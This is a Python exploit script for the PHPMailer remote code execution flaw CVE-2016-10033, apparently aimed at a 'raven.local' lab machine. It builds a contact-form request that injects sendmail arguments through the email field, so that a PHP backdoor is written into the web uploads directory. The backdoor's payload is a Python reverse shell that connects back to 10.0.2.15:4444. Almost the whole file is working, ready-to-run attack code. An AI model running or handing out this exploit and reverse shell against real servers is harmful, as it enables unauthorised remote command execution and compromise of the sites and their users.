#!/usr/bin/env python

"""
 This is exploit for:
     - PHPMailer < 5.2.18 - Remote Code Execution (Python)
     - CVE 2016-10033

 Based on:
     - https://www.exploit-db.com/exploits/40974
"""

from requests_toolbelt import MultipartEncoder
import requests
from onelinerizer import onelinerize
from pwn import *

log.info("Exploit for PHPMailer < 5.2.18 CVE 2016-10033")

# Exploit Options
# ---------------------------------------
target = 'http://raven.local/contact.php'
backdoor_file = 'backdoor.php'
www_path = "/var/www/html/wordpress/wp-content/uploads"
queue_dir_path = "/tmp"
reverse_host = "10.0.2.15"
reverse_port = 4444
# ---------------------------------------

# Standard reverse shell in Python
#  - https://github.com/infodox/python-pty-shells
python_payload = """
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("%s", %i))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

p = subprocess.call(["/bin/sh", "-i"])
""" % (reverse_host, reverse_port)

payload = '''<?php system('python -c %s');  ?>''' % repr(onelinerize(python_payload)).replace("'", "\\'")

log.info("Payload:\n--------------------------\n%s\n--------------------------" % payload)

# Exploit tweaks:
#  - `\"@protonmail.com` not `\" @protonmail.com`
#  - popular skidie protection in public exploits is to chane a character in the exploit
#    in order to not work out of the box
fields = {'action': 'submit',
          'name': payload,
          'email': '"a\\\" -OQueueDirectory=%s -X%s/%s \"@protonmail.com' % (queue_dir_path,
                                                                             www_path,
                                                                             backdoor_file),
          'message': 'Pwned'}

m = MultipartEncoder(fields=fields,
                     boundary='----WebKitFormBoundaryzXJpHSq4mNy35tHe')

headers = {'User-Agent': 'curl/7.47.0',
           'Content-Type': m.content_type}

# If set runs HTTP requests through Burp
proxies = {'http': 'localhost:8080',
           'https': 'localhost:8080'}
# proxies = None


log.info("Sending SHELL to target")

r = requests.post(target, data=m.to_string(),
                  headers=headers, proxies=proxies)

log.info("Finish")

if r.status_code == 200:
    log.info("Exploited %s" % target)
